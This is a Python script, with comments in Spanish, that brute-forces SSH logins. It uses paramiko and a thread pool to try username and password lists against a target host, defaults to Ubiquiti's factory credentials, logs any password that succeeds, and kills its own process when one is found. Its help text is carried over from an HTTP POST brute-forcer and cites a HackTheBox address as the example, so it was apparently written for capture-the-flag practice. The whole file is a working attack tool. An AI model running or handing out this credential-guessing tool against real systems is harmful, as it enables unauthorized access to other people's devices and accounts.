#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import argparse
import concurrent.futures
import concurrent.futures
import logging
import os
import signal
import sys
from pathlib import Path
from typing import List, NoReturn, Dict

import paramiko

from logger import get_logger


def login_ssh(host: str = '192.168.1.20', user: str = 'ubnt', pwd: str = 'ubnt', debug: bool = False,
              port: int = 22, auth_timeout=2) -> bool:
    """
    :param str host: IP del servidor
    :param str user:  Usuario del servidor
    :param str pwd:    Contrasena del usuario cel servidor
    :param str debug:        Establecer modo depuracion para que imprima errores y cree un log
    :param int port:   Puerto en el que escucha el servidor ssh
    """

    # compruebo que el servidor esta online y en caso afirmativo me conecto
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)

    sys.path.append('./')
    if debug:
        paramiko.util.log_to_file('paramiko.log')

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, port, user, pwd, allow_agent=False, look_for_keys=False, auth_timeout=auth_timeout,
                       banner_timeout=200)
    except paramiko.AuthenticationException:
        return False  # , user, pwd
    except paramiko.ssh_exception.SSHException as e:
        # except Exception as e:  # Cuando hay algun fallo lo reintento

        # Si falla en el primer intento durante los s
        #########################################################3
        # logger.warning(f'{user}/{pwd} ----> {e}')
        for i in range(1, 10):
            import time
            time.sleep(1)
            # logger.warning(f'intento {i} {user}/{pwd}')
            try:
                client.connect(host, port, user, pwd, allow_agent=False, look_for_keys=False, auth_timeout=2,
                               banner_timeout=200)
            except paramiko.AuthenticationException:
                return False  # , user, pwd
            except:  # Si vuelve a fallar, se continua por el inicio del bucle para reintentarlo
                continue
            finally:
                client.close()
            return True  # , user, pwd
        else:
            logger.critical(f'user: "{user}", pass: "{pwd}" -> {e}')
            return False  # , user, pwd
    ##############################################################
    finally:
        client.close()
    return True  # , user, pwd


def bound_fetch(executor: concurrent.futures.ThreadPoolExecutor, args: argparse, username: str, dict_passwords: List,
                total_size: int) -> List[str]:
    future_to_ssh = {executor.submit(login_ssh, args.target, username, pwd): pwd for pwd in dict_passwords}

    passwords_unchecked: List[str] = list()
    cont: int = 1
    found: bool = False
    for future in concurrent.futures.as_completed(future_to_ssh):
        # print(future)
        password = future_to_ssh[future]
        passwords_unchecked.append(str(password))
        try:
            data = future.result()
        except Exception as exc:
            logger.error('%r generated an exception: %s' % (password, exc))
            # En el diccionario meto las pass no testeadas
            passwords_unchecked.append(str(password))
        else:
            response: bool = bool(data)
            # username: str = data[1]
            # password: str = data[2]
            if response:
                logger.warning(
                    f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Success')
                p: Path = Path('bruteforce_post_async.log')
                with open(str(p), 'a') as f:
                    f.write(f'Trying: user: "{username}", pass: "{password}" -> Success\n')
                found = True
                break  # salimos para matar el proceso
            else:
                logger.debug(
                    f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Fail')
        cont += 1
    logger.info('llegare???')

    # solo mato el proceso si encuentro la pass
    if found:
        logger.info('Ending')
        # FIXME es la solucion chapuce que se me ocurre, ver como eliminar el resto de procesos de una forma correcta
        os.kill(os.getpid(), signal.SIGTERM)  # or signal.SIGKILL

    logger.info('cerrando???')
    print(passwords_unchecked)
    return passwords_unchecked


def run(args: argparse) -> NoReturn:
    """
    Metodo que realizada una peticion asincrona post por cada elemento de los diccionarios proporcionados
    :param args:
    :return:
    """
    name_username: str
    name_password: str

    dict_users: List = list()
    dict_passwords: List = list()

    logger.debug('Start loading memory dictionaries')
    # creamos un diccionaro de users
    if args.Login is None:
        dict_users.append(args.login)
    else:
        file_username: Path = Path(args.Login)
        if file_username.exists():
            dict_users = file_username.read_text().split('\n')
            dict_users.remove('')  # eliminar lineas en blanco

        else:
            logger.critical(f'File "{args.Login}" not exits')
            sys.exit(1)
    logger.debug('Dictionary of users loaded in memory')

    # creamos un diccionaro de passwords
    if args.Password is None:
        dict_passwords.append(args.password)
    else:
        file_password: Path = Path(args.Password)
        if file_password.exists():
            dict_passwords = file_password.read_text().split('\n')
        else:
            logger.critical(f'File "{args.Password}" not exits')
            sys.exit(1)
    logger.debug('Dictionary of password loaded in memory')

    len_user = len(dict_users)
    len_pwd = len(dict_passwords)

    user: str
    pwd: str

    credentials_unchecked: Dict[str, List[str]] = dict()
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threats) as executor:
        # Create client session that will ensure we dont open new connection per each request.
        for user in dict_users:
            # for pwd in dict_passwords:
            a: List[str] = bound_fetch(executor, args, user, dict_passwords, (len_user * len_pwd))
            credentials_unchecked[user] = a
            with open('pendiente.txt', 'a') as f:
                f.write(f'{user}: ' + str(credentials_unchecked[user]))

    print(credentials_unchecked)


def create_arg_parser() -> argparse:
    """
    Metodo para establecer los argumentos que necesita la clase
    :return:
    """

    example = """python3 %(prog)s  http://docker.hackthebox.eu:31658/ 'Invalid password!' -l admin -P password.txt -j '{"password":""}' -v"""
    my_parser = argparse.ArgumentParser(
        description='%(prog)s is a script to perform brute force attacks by begging HTTP POST requests.',
        usage=f'{example}')

    requiered = my_parser.add_argument_group('requiered arguments')
    requiered.add_argument('target', help='Target to send requests.')

    my_parser.add_argument('-l', '--login', help='Name of a user.', default='root')
    my_parser.add_argument('-L', '--Login', help='Path of a file with users.')
    my_parser.add_argument('-p', '--password', help='A passwords.', default='admin')
    my_parser.add_argument('-P', '--Password', help='Path of a file with passwords.')
    my_parser.add_argument('--threats', help='Number of threads that are sent, by default: os.cpu_count()*5.',
                           type=int, default=os.cpu_count() * 5)
    my_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose flag (boolean).', default=False)

    if len(sys.argv) == 1:
        my_parser.print_help()
        sys.exit(1)
    return my_parser.parse_args()


def main():
    arg: argparse = create_arg_parser()

    global logger
    logger = get_logger(arg.verbose, 'bruteforce')

    if arg.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    run(arg)


if __name__ == '__main__':
    main()
